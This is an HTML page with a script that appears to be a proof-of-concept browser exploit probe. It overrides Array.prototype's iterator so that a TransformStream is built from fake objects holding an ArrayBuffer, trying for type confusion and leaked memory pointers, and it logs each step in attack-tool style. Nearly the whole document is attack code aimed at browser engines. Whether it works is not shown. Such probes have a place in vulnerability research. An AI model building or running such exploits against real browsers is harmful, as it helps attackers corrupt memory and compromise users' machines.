<!DOCTYPE html>
<html>
<body>
<pre id="result" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById("result").textContent += s + '\n'; };
L("[*] Starting TransformStream Type Confusion test...");

const originalIterator = Array.prototype[Symbol.iterator];
let buf = new ArrayBuffer(64); // Native ArrayBuffer

// We hijack the iterator. When TransformStream is created, it iterates internally.
// We return a fake object. We will try to make it look like a valid object to avoid instant crash.
Array.prototype[Symbol.iterator] = function() {
    const arr = this;
    let i = 0;
    return {
        next() {
            if (i >= arr.length)
                return { done: true };
            let val = arr[i];
            // Substitute the 2nd and 3rd elements with fake objects
            if (arr.length === 3 && i >= 1) {
                // A fake object. We put the ArrayBuffer as a property.
                val = { pad1: 0, pad2: 0, ptr: buf, pad3: 0 };
            }
            i++;
            return { value: val, done: false };
        }
    };
};

let stream;
let leakedData = "No leak";

try {
    L("[*] Creating TransformStream with hijacked iterator...");
    stream = new TransformStream();
    L("[+] TransformStream created without immediate crash!");
    
    // If it doesn't crash, try to read properties that might have been confused
    L("[*] Attempting to read stream properties (looking for leaked pointers)...");
    
    let readable = stream.readable;
    let locked = readable.locked;
    L("[*] Readable locked state: " + locked);
    
    // Try to get the controller or internal state
    let controller = stream.transformer;
    L("[*] Transformer: " + controller);
    
} catch (e) {
    L("[!] Exception caught: " + e.message);
    L("[*] If the browser is still alive, check the log above for any weird values.");
} finally {
    // Restore iterator so we can interact with the page if it survives
    Array.prototype[Symbol.iterator] = originalIterator;
}

L("[*] Test finished. If it crashed, note the last line seen.");
</script>
</body>
</html>
